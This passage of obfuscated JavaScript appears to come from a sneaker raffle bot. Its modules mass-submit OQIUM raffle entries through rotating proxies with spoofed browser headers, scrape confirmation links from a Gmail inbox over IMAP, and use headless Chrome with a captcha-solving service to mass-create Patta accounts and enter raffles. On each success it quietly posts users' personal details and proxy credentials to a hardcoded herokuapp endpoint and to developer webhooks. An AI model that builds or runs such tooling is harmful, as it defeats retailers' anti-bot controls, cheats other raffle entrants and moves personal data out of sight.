                                                var _0x2e8a37 = '' + _0x3ea72d, _0x45f9b8 = await _0x105954(_0x2ef0fe[_0x3163a7], _0x3b7f9f, 'dev', !![], _0x2e8a37), _0x2dfd5a = {};
                                                _0x2dfd5a['errorDEV'] = { 'embeds': [_0x45f9b8] }, _0x4d12b6(_0x2ef0fe[_0x3163a7], _0x3b7f9f), _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x2dfd5a['errorDEV']), await _0x4d8e61(_0x369064, _0x2dfd5a['errorDEV']);
                                            }
                                            _0x1ee6e1(console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x3b7f9f['name'] + ']\x20Task\x20' + (_0x3163a7 + 0x1) + ':\x20' + _0x3ea72d)));
                                        }
                                    };
                                    try {
                                        _0x2f002c != 'ver' ? console['log'](_0x5b438b() + '\x20[' + _0x3b7f9f['name'] + ']\x20Task\x20' + (_0x3163a7 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3222db['data']['attributes']['email']) : console['log'](_0x5b438b() + '\x20[' + _0x3b7f9f['name'] + ']\x20Task\x20' + (_0x3163a7 + 0x1) + ':\x20Fetching\x20Response'), _0x417264(_0x243ced, callback);
                                    } catch (_0x319f6f) {
                                        console['log'](_0x5b438b() + '\x20Task\x20' + (_0x3163a7 + 0x1) + ':\x20' + _0x319f6f);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x767f10(_0x3dfee5, 'ver', _0xd6f792, _0x32cf41, _0x30514c), console['log'](_0x5b438b() + '\x20[' + _0xd6f792['name'] + ']\x20Sleeping\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                            } catch (_0x577214) {
                            }
                        }
                    }
                    try {
                        _0x3971e9();
                        while (!_0x2ecfb3) {
                            await _0x415e3e(0xbb8);
                        }
                        console['log']('Found\x20' + _0x44131f['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), await _0x415e3e(0x9c4);
                    }
                    await _0x10a664(_0x361abe, _0x44131f, _0x2b6132);
                }
            }
        ]
    },
    {
        'name': 'OQIUM\x20Store',
        'modules': [
            {
                'name': 'OQIUM\x20Raffle\x20Entries',
                'store': 'OQIUM',
                'logo': 'https://s3-eu-west-1.amazonaws.com/tpd/logos/5e8e742e8f9bb4000118f0bc/0x0.png',
                'url': 'https://a.klaviyo.com/client/subscriptions/?company_id=R3sbqs',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'Yp5jac',
                            'custom_source': 'FD2565-100',
                            'email': '',
                            'properties': {
                                '$first_name': '',
                                '$last_name': '',
                                '$phone_number': '',
                                'Size': '',
                                'Instagram\x20Account': '',
                                '$address1': '',
                                '$zip': '',
                                '$city': '',
                                '$country': '',
                                'Accepts\x20Marketing': ['NoByRaffle'],
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'W4QTqQ',
                                '$consent_form_version': 0x8d41f5,
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x2
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://oqium.com',
                    'referer': 'https://oqium.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3459ad, _0x3899d8, _0x1c8cd8) {
                    var _0x454748 = _0x3899d8, _0x28ebe8 = 0x0;
                    for (var _0x43a0ac = 0x0; _0x43a0ac < _0x3899d8['length']; _0x43a0ac++) {
                        maxTasks = _0x165c4b['threads'];
                        while (_0x28ebe8 >= maxTasks) {
                            await _0x415e3e(_0x165c4b['delay']);
                        }
                        async function _0x3cdf00(_0x164f25, _0x5c5b1b, _0x586ee7, _0x5ca6db) {
                            try {
                                await _0x3da21c(_0x5c5b1b, _0x5ca6db);
                            } catch (_0x5e97aa) {
                                throw new Error(_0x5e97aa);
                            }
                            async function _0x3815f7(_0x10c1d4, _0x2e32f8, _0x2e2bd4, _0x32521a, _0x4f34fa) {
                                _0x28ebe8++;
                                var _0x3ea220, _0x2004da = {}, _0x5a2079 = [], _0x3aa541 = {}, _0x33cbae = [
                                    '40',
                                    '40.5',
                                    '41',
                                    '42',
                                    '42.5',
                                    '43',
                                    '44',
                                    '45',
                                    '45.5',
                                    '46',
                                    '47',
                                    '47.5',
                                    '48'
                                ], _0x2df639 = Math['round'](Math['random']() * (_0x33cbae['length'] - 0x1));
                                !_0x32521a && (_0x32521a = {});
                                if (_0x2e32f8 != 'ver') {
                                    _0x424e52(_0x2e2bd4['name'] + '\x20Task\x20' + (_0x10c1d4 + 0x1) + '\x20/\x20' + _0x32521a['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393), _0x5a2079 = [{
                                        'type': 'rich',
                                        'title': 'Succesful\x20OQIUM\x20Entry',
                                        'description': '',
                                        'color': 0xc0d6d6,
                                        'fields': [
                                            {
                                                'name': 'User',
                                                'value': '' + _0x5f9620
                                            },
                                            {
                                                'name': 'Size',
                                                'value': '' + _0x32521a[_0x10c1d4]['Size']
                                            },
                                            {
                                                'name': 'Delay',
                                                'value': '' + _0x165c4b['delay']
                                            },
                                            {
                                                'name': 'Version',
                                                'value': '' + _0x57c4cf
                                            }
                                        ]
                                    }], _0x3aa541 = { 'embeds': _0x5a2079 }, _0x2004da = _0x2e2bd4['data'], _0x2004da['data']['attributes']['email'] = '' + _0x32521a[_0x10c1d4]['Email'];
                                    if (_0x32521a[_0x10c1d4]['Size'] == 'RANDOM') {
                                    }
                                    _0x2004da['data']['attributes']['properties']['$first_name'] = '' + _0x32521a[_0x10c1d4]['FirstName'], _0x2004da['data']['attributes']['properties']['$last_name'] = '' + _0x32521a[_0x10c1d4]['LastName'], _0x2004da['data']['attributes']['properties']['$address1'] = _0x32521a[_0x10c1d4]['Address1'] + '\x20' + _0x32521a[_0x10c1d4]['Address2'] + '\x20' + _0x32521a[_0x10c1d4]['HouseNumber'], _0x2004da['data']['attributes']['properties']['$zip'] = '' + _0x32521a[_0x10c1d4]['Zip'], _0x2004da['data']['attributes']['properties']['$city'] = '' + _0x32521a[_0x10c1d4]['City'], _0x2004da['data']['attributes']['properties']['$country'] = '' + _0x32521a[_0x10c1d4]['Country'], _0x32521a[_0x10c1d4]['Size'] == 'RANDOM' ? _0x2004da['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x33cbae[_0x2df639] : _0x2004da['data']['attributes']['properties']['Size'] = 'US\x20W\x20/\x20EU\x20' + _0x32521a[_0x10c1d4]['Size'], _0x2004da['data']['attributes']['properties']['$phone_number'] = '' + _0x32521a[_0x10c1d4]['Phone'], _0x2004da['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x32521a[_0x10c1d4]['Follower'];
                                }
                                if (_0x165c4b['useRandomProxy'] = ![])
                                    var _0x32c830 = _0x4f34fa[_0x10c1d4]['split'](':');
                                else
                                    var _0xffbc8c = Math['round'](Math['random']() * (_0x4f34fa['length'] - 0x1)), _0x32c830 = _0x4f34fa[_0xffbc8c]['split'](':');
                                var _0x2afc3e = {
                                    'jar': _0x15ef28,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x2e2bd4['url'],
                                    'headers': _0x2e2bd4['headers'],
                                    'body': JSON['stringify'](_0x2004da),
                                    'proxy': 'http://' + _0x32c830[0x2] + ':' + _0x32c830[0x3] + '@' + _0x32c830[0x0] + ':' + _0x32c830[0x1]
                                };
                                return _0x2e32f8 != 'ver' && (_0x2afc3e['url'] = _0x2e2bd4['url'], _0x2afc3e['headers'] = _0x2e2bd4['headers']), _0x2e32f8 == 'ver' && (_0x2afc3e['method'] = 'GET'), new Promise(function (_0x1a01c1, _0x340faf) {
                                    callback = async (_0x185579, _0x3301eb, _0x1c7006) => {
                                        if (!_0x185579 && _0x3301eb['statusCode'] == 0xca || !_0x185579 && _0x3301eb['statusCode'] == 0xc8) {
                                            if (_0x2e32f8 != 'ver') {
                                                var _0x9c4fc6 = await _0x105954(_0x32521a[_0x10c1d4], _0x2e2bd4, 'dev', ![]), _0x424c59 = await _0x105954(_0x32521a[_0x10c1d4], _0x2e2bd4, 'pub', ![]);
                                                const _0xe9aa80 = {
                                                    'succesDEVMSG': { 'embeds': [_0x9c4fc6] },
                                                    'succesPUBMSG': { 'embeds': [_0x424c59] }
                                                };
                                                let _0x47e116 = _0x32521a[_0x10c1d4];
                                                try {
                                                    prxdata = {
                                                        'username': _0x5f9620['replace']('#', ''),
                                                        'module': _0x2e2bd4['name'],
                                                        'entrydata': JSON['stringify'](_0x47e116),
                                                        'proxy': '' + _0x4f34fa[_0x10c1d4]
                                                    };
                                                    var _0x5263bd = JSON['stringify'](prxdata);
                                                    let _0x1da149 = { 'headers': { 'content-type': 'application/json' } };
                                                    await _0x328de3['post']('https://jraffles.herokuapp.com/success', _0x5263bd, _0x1da149);
                                                } catch (_0x19058b) {
                                                }
                                                if (_0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '')
                                                    try {
                                                        await _0x4d8e61(_0x165c4b['webhook'], _0xe9aa80['succesDEVMSG']);
                                                    } catch {
                                                    }
                                                await _0x415e3e(0xc8), await _0x4d8e61(_0xbd9f1e, _0xe9aa80['succesDEVMSG']), await _0x415e3e(0xc8);
                                                try {
                                                    await _0x4d8e61(_0x3ba9f8, _0xe9aa80['succesPUBMSG']);
                                                } catch {
                                                }
                                                _0x53db49(_0x32521a[_0x10c1d4], _0x2e2bd4);
                                            }
                                            _0x28ebe8--, _0x1a01c1(console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x2e2bd4['name'] + ']\x20Task\x20' + (_0x10c1d4 + 0x1) + ':\x20Raffle\x20Entered!')));
                                        } else {
                                            if (_0x2e32f8 != 'ver') {
                                                var _0x4d784c = '' + _0x185579, _0x46aa9b = await _0x105954(_0x32521a[_0x10c1d4], _0x2e2bd4, 'dev', !![], _0x4d784c), _0x5207b9 = {};
                                                _0x5207b9['errorDEV'] = { 'embeds': [_0x46aa9b] }, _0x4d12b6(_0x32521a[_0x10c1d4], _0x2e2bd4), _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x5207b9['errorDEV']), await _0x4d8e61(_0x369064, _0x5207b9['errorDEV']);
                                            }
                                            _0x28ebe8--, _0x340faf(console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x2e2bd4['name'] + ']\x20Task\x20' + (_0x10c1d4 + 0x1) + ':\x20' + _0x185579)));
                                        }
                                    };
                                    try {
                                        _0x2e32f8 != 'ver' && console['log'](_0x5b438b() + '\x20[' + _0x2e2bd4['name'] + ']\x20Task\x20' + (_0x10c1d4 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x2004da['data']['attributes']['email']), _0x417264(_0x2afc3e, callback);
                                    } catch (_0x3727b0) {
                                        console['log'](_0x5b438b() + '\x20Task\x20' + (_0x10c1d4 + 0x1) + ':\x20' + _0x3727b0);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x3815f7(_0x5ca6db, 'nor', _0x164f25, _0x5c5b1b, _0x586ee7), console['log'](_0x5b438b() + '\x20[' + _0x164f25['name'] + ']\x20Sleeping\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                            } catch (_0x2ec7ad) {
                            }
                        }
                        _0x3cdf00(_0x3459ad, _0x454748, _0x1c8cd8, _0x43a0ac), await _0x415e3e(0x3e8);
                    }
                }
            },
            {
                'name': 'OQIUM\x20Raffle\x20Verification',
                'url': '',
                'data': {
                    'data': {
                        'type': 'subscription',
                        'attributes': {
                            'list_id': 'TFTWYv',
                            'custom_source': 'Air\x20Jordan\x201\x20Retro\x20High\x20OG\x20Lost\x20and\x20Found',
                            'email': '',
                            'properties': {
                                '$address1': '',
                                '$city': '',
                                '$country': '',
                                '$first_name': '',
                                '$last_name': '',
                                '$zip': '',
                                '$consent_method': 'Klaviyo\x20Form',
                                '$consent_form_id': 'V4PNGA',
                                '$consent_form_version': 0x6fd46d,
                                'Instagram\x20Handle': '',
                                'Shipping': 'Shipping',
                                'Size': '',
                                'services': '{\x22shopify\x22:{\x22source\x22:\x22form\x22}}',
                                '$timezone_offset': 0x1
                            }
                        }
                    }
                },
                'headers': {
                    'accept': '*/*',
                    'accept-encoding': 'gzip,\x20deflate,\x20br',
                    'access-control-allow-headers': '*',
                    'content-type': 'application/json',
                    'origin': 'https://www.maha-amsterdam.com',
                    'referer': 'https://www.maha-amsterdam.com/',
                    'revision': '2022-02-16',
                    'User-Agent': 'Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36',
                    'sec-ch-ua': '\x22Chromium\x22;v=\x22106\x22,\x20\x22Google\x20Chrome\x22;v=\x22106\x22,\x20\x22Not;A=Brand\x22;v=\x2299\x22',
                    'sec-ch-ua-mobile': '?0',
                    'sec-ch-ua-platform': '\x27Windows\x27',
                    'sec-fetch-dest': 'empty',
                    'sec-fetch-mode': 'cors',
                    'sec-fetch-site': 'cross-site'
                },
                'function': async function (_0x3bf605, _0x1b74ac, _0xc4b925) {
                    var _0x1b74ac = [], _0x16853c = ![];
                    async function _0x506547() {
                        var _0x47b50f = new _0x569e4e({
                            'user': _0x165c4b['masterMail'],
                            'password': _0x165c4b['masterPassword'],
                            'host': 'imap.gmail.com',
                            'port': 0x3e1,
                            'tls': !![],
                            'autotls': 'always'
                        });
                        function _0x1ff54b(_0x87326b) {
                            _0x47b50f['openBox']('INBOX', ![], _0x87326b);
                        }
                        _0x47b50f['once']('ready', function () {
                            _0x1ff54b(function (_0x45d6e6, _0x2bce4b) {
                                console['clear'](), console['log']('Looking\x20For\x20Links');
                                if (_0x45d6e6)
                                    throw _0x45d6e6;
                                _0x47b50f['seq']['search']([
                                    'UNSEEN',
                                    [
                                        'SUBJECT',
                                        'Confirm\x20Your\x20Subscription'
                                    ],
                                    [
                                        'FROM',
                                        'OQIUM'
                                    ]
                                ], function (_0x589963, _0x35181b) {
                                    if (!_0x35181b || !_0x35181b['length'])
                                        console['log'](_0x5b438b() + '\x20[' + _0x3bf605['name'] + ']\x20No\x20mails\x20found'), _0x47b50f['end']();
                                    else {
                                        var _0x3726aa = _0x47b50f['seq']['fetch'](_0x35181b, {
                                            'bodies': '',
                                            'markSeen': !![]
                                        });
                                        _0x3726aa['on']('message', function (_0x2110cd, _0x2754a6) {
                                            var _0xb4e1c7 = '(#' + _0x2754a6 + ')\x20';
                                            _0x2110cd['on']('body', function (_0x20c47f, _0x2f7fac) {
                                                _0x2736cb(_0x20c47f, (_0x23e5c3, _0x48075d) => {
                                                    var _0x5eb96a = _0x48075d['text']['split']('(')[0x1], _0x49fdc2 = _0x5eb96a['split'](')')[0x0];
                                                    _0x1b74ac['push'](_0x49fdc2);
                                                });
                                            }), _0x2110cd['once']('end', function () {
                                            });
                                        }), _0x3726aa['once']('error', function (_0x4c0962) {
                                            console['log']('Fetch\x20error:\x20' + _0x4c0962), _0x16853c = !![];
                                        }), _0x3726aa['once']('end', function () {
                                            _0x47b50f['end'](), _0x16853c = !![];
                                        });
                                    }
                                });
                            });
                        }), _0x47b50f['once']('error', function (_0x14657b) {
                            console['log'](_0x14657b), _0x16853c = !![];
                        }), _0x47b50f['once']('end', async function () {
                            _0x16853c = !![];
                        }), _0x47b50f['connect']();
                    }
                    async function _0x3558f3(_0xfd28ea, _0x1c7d9e, _0xc0eaaf) {
                        for (var _0x23552d = 0x0; _0x23552d < _0x1c7d9e['length']; _0x23552d++) {
                            async function _0x5b5888(_0xd7e6ea, _0x57f978, _0x1aed5b, _0x38b91b, _0x1db470) {
                                var _0x45d5f3, _0x5a9e17 = {}, _0x1a81ba = [], _0x5e8439 = {}, _0x1c35ce = [
                                    '40',
                                    '40,5',
                                    '41',
                                    '42',
                                    '42,5',
                                    '43',
                                    '44',
                                    '45',
                                    '45,5',
                                    '46',
                                    '47',
                                    '47,5',
                                    '48'
                                ], _0x2e405c = Math['round'](Math['random']() * (_0x1c35ce['length'] - 0x1));
                                _0x38b91b[_0xd7e6ea]['Size'] == 'RANDOM' && (_0x38b91b[_0xd7e6ea]['Size'] = _0x1c35ce[_0x2e405c]);
                                !_0x38b91b && (_0x38b91b = {});
                                if (_0x165c4b['useRandomProxy'] = ![])
                                    var _0x3f8121 = _0x1db470[_0xd7e6ea]['split'](':');
                                else
                                    var _0xe06b92 = Math['round'](Math['random']() * (_0x1db470['length'] - 0x1)), _0x3f8121 = _0x1db470[_0xe06b92]['split'](':');
                                var _0x3ef288 = {
                                    'jar': _0x15ef28,
                                    'followAllRedirects': !![],
                                    'method': 'POST',
                                    'url': _0x1aed5b['url'],
                                    'headers': _0x1aed5b['headers'],
                                    'body': JSON['stringify'](_0x5a9e17),
                                    'proxy': 'http://' + _0x3f8121[0x2] + ':' + _0x3f8121[0x3] + '@' + _0x3f8121[0x0] + ':' + _0x3f8121[0x1]
                                };
                                return _0x57f978 == 'ver' && (_0x3ef288['method'] = 'GET', _0x3ef288['url'] = _0x38b91b[_0xd7e6ea]), new Promise(function (_0x1c5cff, _0x33432b) {
                                    callback = async (_0xbf6c9e, _0x4399c0, _0x13b2d1) => {
                                        !_0xbf6c9e && _0x4399c0['statusCode'] == 0xca || !_0xbf6c9e && _0x4399c0['statusCode'] == 0xc8 ? _0x1c5cff(console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x1aed5b['name'] + ']\x20Task\x20' + (_0xd7e6ea + 0x1) + ':\x20Raffle\x20Entered!'))) : _0x33432b(console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x1aed5b['name'] + ']\x20Task\x20' + (_0xd7e6ea + 0x1) + ':\x20' + _0xbf6c9e)));
                                    };
                                    try {
                                        _0x57f978 != 'ver' ? console['log'](_0x5b438b() + '\x20[' + _0x1aed5b['name'] + ']\x20Task\x20' + (_0xd7e6ea + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x5a9e17['data']['attributes']['email']) : console['log'](_0x5b438b() + '\x20[' + _0x1aed5b['name'] + ']\x20Task\x20' + (_0xd7e6ea + 0x1) + ':\x20Fetching\x20Response'), _0x417264(_0x3ef288, callback);
                                    } catch (_0x51c94a) {
                                        console['log'](_0x5b438b() + '\x20Task\x20' + (_0xd7e6ea + 0x1) + ':\x20' + _0x51c94a);
                                    }
                                });
                            }
                            ;
                            try {
                                await _0x5b5888(_0x23552d, 'ver', _0xfd28ea, _0x1c7d9e, _0xc0eaaf), console['log'](_0x5b438b() + '\x20[' + _0xfd28ea['name'] + ']\x20Sleeping\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                            } catch (_0x1a98f0) {
                                console['log'](_0x1a98f0), await _0x415e3e(0x2710);
                            }
                        }
                    }
                    try {
                        _0x506547();
                        while (!_0x16853c) {
                            await _0x415e3e(0xfa0);
                        }
                        console['log']('Found\x20' + _0x1b74ac['length'] + '\x20Links\x20in\x20Mailbox');
                    } catch (_0x29a461) {
                        console['log']('Searching\x20mailbox\x20failed,\x20please\x20read\x20the\x20guide\x20on\x20how\x20to\x20setup..'), console['log'](_0x29a461), await _0x415e3e(0x2710);
                    }
                    try {
                        await _0x3558f3(_0x3bf605, _0x1b74ac, _0xc4b925);
                    } catch (_0x5bcf07) {
                        console['log'](_0x5bcf07), await _0x415e3e(0x2710);
                    }
                }
            }
        ]
    },
    {
        'name': 'PATTA',
        'modules': [
            {
                'name': 'PATTA\x20Account\x20Generator',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x438b53, _0xc940c4, _0x747f20) {
                    _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x165c4b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xde33bc = 0x0; _0xde33bc < _0xc940c4['length']; _0xde33bc++) {
                        var _0x553870 = [{
                            'type': 'rich',
                            'title': 'Succesful\x20Patta\x20Account\x20Generated',
                            'description': '',
                            'color': 0xc0d6d6,
                            'fields': [
                                {
                                    'name': 'User',
                                    'value': '' + _0x5f9620
                                },
                                {
                                    'name': 'Delay',
                                    'value': '' + _0x165c4b['delay']
                                },
                                {
                                    'name': 'Version',
                                    'value': '' + _0x57c4cf
                                }
                            ]
                        }];
                        const _0x1f9e23 = { 'embeds': _0x553870 };
                        _0x424e52(_0x438b53['name'] + '\x20Task\x20' + (_0xde33bc + 0x1) + '\x20/\x20' + _0xc940c4['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                        try {
                            await _0x3da21c(_0xc940c4, _0xde33bc);
                        } catch {
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        var _0x4ffc6b = await _0x105954(_0xc940c4[_0xde33bc], _0x438b53, 'acc', ![]);
                        const _0x29a851 = { 'succesDEVMSG': { 'embeds': [_0x4ffc6b] } };
                        if (_0xc940c4[_0xde33bc]['Email'] == '' || _0xc940c4[_0xde33bc]['FirstName'] == '' || _0xc940c4[_0xde33bc]['LastName'] == '') {
                            console['log'](_0x5b438b() + '\x20[' + _0x461a68[taskModule]['name'] + ']\x20Task\x20' + (_0xde33bc + 0x1) + '\x20:\x20Invalid\x20CSV'), await _0x415e3e(0x7d0);
                            continue;
                        }
                        (_0xc940c4[_0xde33bc]['Password'] == '' || _0xc940c4[_0xde33bc] == undefined) && _0xc940c4[_0xde33bc]['Password'] == 'JRaffles23!';
                        if (_0x165c4b['useRandomProxy'] = ![])
                            var _0x5299b5 = _0x747f20[_0xde33bc]['split'](':');
                        else
                            var _0x345175 = Math['round'](Math['random']() * (_0x747f20['length'] - 0x1)), _0x5299b5 = _0x747f20[_0x345175]['split'](':');
                        var _0x481e40;
                        try {
                            _0x481e40 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5299b5[0x0] + ':' + _0x5299b5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x481e40 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x5299b5[0x0] + ':' + _0x5299b5[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x4a9198 = await _0x481e40['newPage']();
                            await _0x4a9198['authenticate']({
                                'username': '' + _0x5299b5[0x2],
                                'password': '' + _0x5299b5[0x3]
                            }), console['log'](_0x5b438b() + '\x20[' + _0x438b53['name'] + ']\x20Task\x20' + (_0xde33bc + 0x1) + '\x20:\x20Getting\x20Session'), await _0x4a9198['setRequestInterception'](!![]), _0x4a9198['on']('request', _0x4623a8 => {
                                _0x4623a8['resourceType']() === 'image' || _0x4623a8['resourceType']() === 'font' || _0x4623a8['resourceType']() === 'media' ? _0x4623a8['abort']() : _0x4623a8['continue']();
                            }), await _0x4a9198['goto']('https://patta.nl/account/register'), await _0x415e3e(0xbb8), await _0x4a9198['waitForSelector']('#RegisterForm-FirstName'), console['log'](_0x5b438b() + '\x20[' + _0x438b53['name'] + ']\x20Task\x20' + (_0xde33bc + 0x1) + '\x20:\x20Filling\x20information'), await _0x4a9198['type']('#RegisterForm-FirstName', '' + _0xc940c4[_0xde33bc]['FirstName']), await _0x415e3e(0x226), await _0x4a9198['type']('#RegisterForm-LastName', '' + _0xc940c4[_0xde33bc]['LastName']), await _0x415e3e(0x226), await _0x4a9198['type']('#RegisterForm-email', '' + _0xc940c4[_0xde33bc]['Email']), await _0x415e3e(0x226), await _0x4a9198['type']('#RegisterForm-password', '' + _0xc940c4[_0xde33bc]['Password']), await _0x415e3e(0x226), console['log'](_0x5b438b() + '\x20[' + _0x438b53['name'] + ']\x20Task\x20' + (_0xde33bc + 0x1) + '\x20:\x20Submitting..'), await _0x4a9198['$eval']('#RegisterForm', _0x158ede => _0x158ede['submit']()), await _0x415e3e(0x1f40);
                            try {
                                await _0x4a9198['waitForSelector']('.home-page-grid__collection'), await _0x415e3e(0x1f4), console['log'](_0x5dc29b['green'](_0x5b438b() + '\x20[' + _0x438b53['name'] + ']\x20Task\x20' + (_0xde33bc + 0x1) + '\x20:\x20Account\x20' + _0xc940c4[_0xde33bc]['Email'] + '\x20Generated!')), _0xaf9669['appendFileSync']('../accounts/patta.csv', '\x0a' + _0xc940c4[_0xde33bc]['Email'] + ',' + _0xc940c4[_0xde33bc]['Password']), console['log'](_0x5dc29b['yellow'](_0x5b438b() + '\x20[' + _0x438b53['name'] + ']\x20Task\x20' + (_0xde33bc + 0x1) + '\x20:\x20Account\x20' + _0xc940c4[_0xde33bc]['Email'] + '\x20Saved\x20in\x20\x27accounts/patta.csv\x27'));
                                try {
                                    _0x165c4b['webhook'] != undefined && _0x165c4b['webhook'] != '' && await _0x4d8e61(_0x165c4b['webhook'], _0x29a851['succesDEVMSG']);
                                } catch {
                                }
                                await _0x4d8e61(_0xd282bc, _0x29a851['succesDEVMSG']);
                            } catch (_0x554df4) {
                                console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x461a68[taskModule]['name'] + ']\x20Task\x20' + (_0xde33bc + 0x1) + '\x20:\x20Account\x20genration\x20failed.\x20' + _0x554df4));
                            }
                        } catch (_0x335179) {
                            console['log'](_0x5dc29b['red'](_0x5b438b() + '\x20[' + _0x461a68[taskModule]['name'] + ']\x20Task\x20' + (_0xde33bc + 0x1) + '\x20:\x20' + _0x335179));
                        } finally {
                            _0x481e40 && _0x481e40['close'](), console['log']('Waiting\x20for\x20' + _0x165c4b['delay'] + '\x20ms'), await _0x415e3e(_0x165c4b['delay']);
                        }
                    }
                }
            },
            {
                'name': 'PATTA\x20Raffle\x20Entries',
                'store': 'Patta',
                'logo': 'https://cdn.shopify.com/s/files/1/0473/6965/0340/collections/patta_42f8af38-44b4-4c1b-a6f3-ec368a7b6f58_1200x1200.jpg?v=1665406562',
                'function': async function (_0x3cbd34, _0x2d65e1, _0x5a36b9) {
                    _0x275ae5['use'](_0x149eeb()), _0x275ae5['use'](_0x5dbd94({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x165c4b['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x3868dc = 0x0; _0x3868dc < _0x2d65e1['length']; _0x3868dc++) {
                        var _0x4cea74;
                        if (_0x32a300 != 'yes')
                            var _0x32a300 = '', _0x29944c = 0x0;
                        _0x424e52(_0x3cbd34['name'] + '\x20Task\x20' + (_0x3868dc + 0x1) + '\x20/\x20' + _0x2d65e1['length'] + '\x20||\x20File:\x20' + _0x5ce28a + '\x20Proxies:\x20' + _0x268393);
                        try {
                            await _0x3da21c(_0x2d65e1, _0x3868dc);
                        } catch {
                            _0x32a300 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        if (_0x2d65e1[_0x3868dc]['Email'] == '' || _0x2d65e1[_0x3868dc]['Password'] == '' || _0x2d65e1[_0x3868dc]['FirstName'] == '' || _0x2d65e1[_0x3868dc]['LastName'] == '') {
                            console['log'](_0x5b438b() + '\x20[' + _0x461a68[taskModule]['name'] + ']\x20Task\x20' + (_0x3868dc + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        if (_0x165c4b['useRandomProxy'] = ![])
                            var _0x44fb97 = _0x5a36b9[_0x3868dc]['split'](':');
                        else
                            var _0x8de618 = Math['round'](Math['random']() * (_0x5a36b9['length'] - 0x1)), _0x44fb97 = _0x5a36b9[_0x8de618]['split'](':');
                        var _0x414d54;
                        try {
                            _0x414d54 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x44fb97[0x0] + ':' + _0x44fb97[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x414d54 = await _0x275ae5['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
